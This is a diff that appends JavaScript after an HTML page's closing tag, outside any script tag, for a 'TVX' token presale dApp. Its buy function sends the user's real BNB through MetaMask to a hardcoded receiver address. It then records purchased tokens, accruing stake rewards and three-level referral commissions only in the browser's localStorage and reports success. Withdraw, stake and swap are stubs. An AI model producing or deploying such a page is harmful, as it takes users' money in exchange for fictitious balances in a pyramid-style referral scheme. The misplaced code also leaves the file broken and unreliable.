@@ -457,3 +457,225 @@
 </body>
 
 </html>
+// ================= CONFIG =================
+const RECEIVER = "0xdeAD000000000000000000000000000000000000";
+const RATE = 10000;
+const TVX_USD = 0.01;
+
+let BNB_USD = 600;
+let account, provider, signer;
+
+// ================= LOCAL DB =================
+const db = () => JSON.parse(localStorage.getItem("tvx_vFinal_PRO_V3")) || {};
+const save = d => localStorage.setItem("tvx_vFinal_PRO_V3", JSON.stringify(d));
+
+// ================= SIDEBAR =================
+function toggleSidebar() {
+    document.getElementById('sidebar')?.classList.toggle('sidebar-folded');
+}
+
+// ================= PRICE FETCH =================
+async function fetchPrice() {
+    try {
+        const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd");
+        const data = await res.json();
+
+        if (data?.binancecoin?.usd) {
+            BNB_USD = data.binancecoin.usd;
+            document.getElementById("liveBNB").innerText = "$" + BNB_USD.toFixed(2);
+        }
+    } catch (e) {
+        BNB_USD = 600;
+    }
+}
+
+// ================= REF LINK =================
+function updateRefLink() {
+    if (!account) return;
+    const el = document.getElementById("refLink");
+    if (el) el.value = window.location.origin + "?ref=" + account;
+}
+
+// ================= CONNECT WALLET =================
+async function connect() {
+    if (!window.ethereum) return alert("MetaMask Required");
+
+    try {
+        const accs = await window.ethereum.request({ method: "eth_requestAccounts" });
+
+        account = accs[0].toLowerCase();
+
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+        signer = provider.getSigner();
+
+        let d = db();
+
+        if (!d[account]) {
+            let ref = new URLSearchParams(location.search).get("ref");
+
+            d[account] = {
+                sponsor: ref ? ref.toLowerCase() : null,
+                directs: [],
+                tvx: 0,
+                stakedTvx: 0,
+                bnb: 0,
+                active: false,
+                stakeStart: 0,
+                lastClaimTime: 0,
+                txHistory: [],
+                claimed: []
+            };
+
+            if (ref && d[ref.toLowerCase()]) {
+                d[ref.toLowerCase()].directs.push(account);
+            }
+
+            save(d);
+        }
+
+        document.getElementById("connectBtn")?.classList.add("hidden");
+
+        const walletDisplay = document.getElementById("walletDisplay");
+        if (walletDisplay) {
+            walletDisplay.classList.remove("hidden");
+            walletDisplay.classList.add("flex");
+            walletDisplay.innerText = account.slice(0, 6) + "..." + account.slice(-4);
+        }
+
+        updateRefLink();
+
+        await update();
+        setInterval(update, 2000);
+
+        alert("Wallet Connected");
+
+    } catch (err) {
+        console.error(err);
+        alert("Connection Failed");
+    }
+}
+
+// ================= COPY REF =================
+function copyRef() {
+    const el = document.getElementById("refLink");
+    if (!el || !el.value) return alert("Connect wallet first");
+
+    navigator.clipboard.writeText(el.value);
+    alert("Copied!");
+}
+
+// ================= PREVIEW =================
+function updatePreview() {
+    let bnb = parseFloat(document.getElementById("bnbInput")?.value) || 0;
+    document.getElementById("previewTVX").innerText = (bnb * RATE).toFixed(2) + " TVX";
+}
+
+function updateSwapPreview() {
+    let tvx = parseFloat(document.getElementById("swapInput")?.value) || 0;
+    document.getElementById("swapPreviewBNB").innerText = (tvx / RATE).toFixed(4) + " BNB";
+}
+
+// ================= MAIN UPDATE LOOP =================
+async function update() {
+    if (!account) return;
+
+    let d = db();
+    let u = d[account];
+    if (!u) return;
+
+    try {
+        const bal = await provider.getBalance(account);
+        document.getElementById("bnbBal").innerText =
+            parseFloat(ethers.utils.formatEther(bal)).toFixed(4);
+    } catch {}
+
+    // reward calc
+    let liveReward = 0;
+
+    if (u.active && u.stakeStart && u.stakedTvx) {
+        let elapsed = (Date.now() - u.stakeStart) / 1000;
+        liveReward = (u.stakedTvx * 0.001 * elapsed) / 86400;
+    }
+
+    document.getElementById("stakeProfit").innerText = liveReward.toFixed(6) + " TVX";
+    document.getElementById("tvxBal").innerText = (u.tvx || 0).toFixed(2);
+    document.getElementById("income").innerText = (u.bnb || 0).toFixed(4) + " BNB";
+
+    // HISTORY SAFE FIX
+    const txList = document.getElementById("txList");
+
+    if (txList) {
+        if (u.txHistory && u.txHistory.length) {
+            txList.innerHTML = u.txHistory.slice(0, 8).map(t => `
+                <tr class="border-b border-white/5">
+                    <td class="py-2 text-emerald-400 font-bold">${t.type}</td>
+                    <td>${t.amt}</td>
+                    <td class="text-right text-green-400">DONE</td>
+                </tr>
+            `).join('');
+        } else {
+            txList.innerHTML = `<tr><td colspan="3" class="py-6 text-center opacity-10">No History</td></tr>`;
+        }
+    }
+}
+
+// ================= BUY =================
+async function buy() {
+    if (!account) return alert("Connect wallet first");
+
+    let bnbAmt = document.getElementById("bnbInput")?.value;
+    if (!bnbAmt || bnbAmt <= 0) return;
+
+    try {
+        const tx = await signer.sendTransaction({
+            to: RECEIVER,
+            value: ethers.utils.parseEther(bnbAmt)
+        });
+
+        await tx.wait();
+
+        let d = db();
+        let tvxGot = bnbAmt * RATE;
+
+        d[account].tvx = (d[account].tvx || 0) + tvxGot;
+
+        // referral commission
+        let sponsor = d[account].sponsor;
+
+        for (let i = 1; i <= 3; i++) {
+            if (!sponsor || !d[sponsor]) break;
+
+            let c = i === 1 ? 0.05 : i === 2 ? 0.03 : 0.02;
+
+            d[sponsor].tvx = (d[sponsor].tvx || 0) + tvxGot * c * 0.5;
+            d[sponsor].bnb = (d[sponsor].bnb || 0) + (tvxGot * c * 0.5 * TVX_USD) / BNB_USD;
+
+            sponsor = d[sponsor].sponsor;
+        }
+
+        if (!d[account].txHistory) d[account].txHistory = [];
+
+        d[account].txHistory.unshift({
+            type: "BUY TVX",
+            amt: tvxGot.toFixed(2)
+        });
+
+        save(d);
+
+        alert("Purchase Success");
+
+    } catch (e) {
+        console.error(e);
+        alert("Transaction Failed");
+    }
+}
+
+// ================= SIMPLE ACTIONS =================
+function stakeTokens() { alert("Stake feature needs smart contract"); }
+function internalSwap() { alert("Swap feature needs smart contract"); }
+function withdraw() { alert("Withdraw needs backend/contract"); }
+function logout() { location.reload(); }
+
+// ================= INIT =================
+fetchPrice();
+setInterval(fetchPrice, 60000);
